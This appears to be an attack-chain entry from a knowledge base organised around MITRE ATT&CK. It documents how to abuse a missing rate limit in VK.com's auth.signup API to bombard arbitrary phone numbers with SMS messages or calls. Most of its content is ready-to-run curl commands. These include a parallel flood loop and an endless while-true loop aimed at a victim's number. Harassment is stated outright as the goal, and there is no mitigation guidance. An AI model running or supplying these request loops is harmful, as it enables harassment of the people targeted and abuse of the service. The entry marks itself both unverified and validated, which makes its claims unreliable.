---
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
tags:
  - rate-limit-bypass
  - api-abuse
  - sms-flood
  - harassment
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
verified: false
platforms:
  - Web
  - API
submitted: true
complexity: medium
created_at: '2023-10-01T12:00:00Z'
procedures:
  - '[[procedures/Identify-Rate-Limit-Bypass-in-Auth-Signup-API]]'
  - '[[procedures/Exploit-API-for-Mass-SMS-and-Calls]]'
step_count: 2
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:32:10.545Z'
description: >-
  Attack chain exploiting lack of flood control in VK.com's auth.signup API to
  bypass rate limits and send unlimited SMS notifications or calls to arbitrary
  phone numbers, enabling harassment.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Rate Limit Bypass in VK.com Auth Signup for Infinite SMS and Calls

Multi-stage attack chain demonstrating exploitation of VK.com's auth.signup API vulnerability, allowing unlimited requests without flood control to trigger excessive SMS or calls for harassment.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Identify API Vulnerability] --> B[Exploit for Abuse]
    B --> C[Harassment via Notifications]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- None (uses standard HTTP clients like curl)

### Target Environment

- VK.com API endpoints
- Access to phone numbers for testing
- No authentication required for auth.signup

### Initial Access Requirements

- Public internet access
- API documentation or prior knowledge of auth.signup
- No credentials needed

## Detailed Attack Procedures

### Step 1: Identify Rate Limiting Bypass
procedure: [[procedures/Identify-Rate-Limit-Bypass-in-Auth-Signup-API]]

**Objective**: Test and confirm the absence of flood control in the auth.signup API method to bypass SMS/call limits.

**Instructions**: Use [[commands/curl-test-api-rate-limit]] to send initial requests to the auth.signup endpoint and monitor for throttling. Repeat requests rapidly to verify no limits are enforced.

```bash
curl -X POST 'https://api.vk.com/method/auth.signup' -d 'phone=1234567890&other_params=value'
```

Then, script multiple requests using [[commands/curl-mass-request-script]] to simulate flood:

```bash
for i in {1..10}; do curl -X POST 'https://api.vk.com/method/auth.signup' -d 'phone=1234567890&other_params=value' & done
```

**Expected Output**: Successful responses without error codes for rate limiting (e.g., no 429 errors), confirming bypass.

**Success Indicators**:
- Multiple requests succeed without throttling
- SMS or call notifications received on test phone

### Step 2: Exploit for Mass SMS and Calls
procedure: [[procedures/Exploit-API-for-Mass-SMS-and-Calls]]

**Objective**: Leverage the bypass to send unlimited notifications to arbitrary phone numbers, enabling abuse like harassment.

**Instructions**: Use [[commands/curl-exploit-sms-flood]] to target arbitrary phone numbers with repeated auth.signup calls, triggering SMS or voice calls.

```bash
curl -X POST 'https://api.vk.com/method/auth.signup' -d 'phone=+12345678901&other_params=value'
```

Scale up with a loop or script using [[commands/curl-infinite-request-loop]]:

```bash
while true; do curl -X POST 'https://api.vk.com/method/auth.signup' -d 'phone=+12345678901&other_params=value'; sleep 1; done
```

**Expected Output**: Continuous successful API responses, with the target phone receiving endless SMS or calls.

**Success Indicators**:
- Target phone overwhelmed with notifications
- No API-side blocking observed

## Attack Chain Summary

### Key Achievements

1. Confirmed rate limit bypass in auth.signup API
2. Enabled infinite SMS/call abuse to arbitrary numbers
3. Demonstrated potential for harassment without detection

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Initial Access]]

---
*Last updated: 2023-10-01T12:00:00Z*
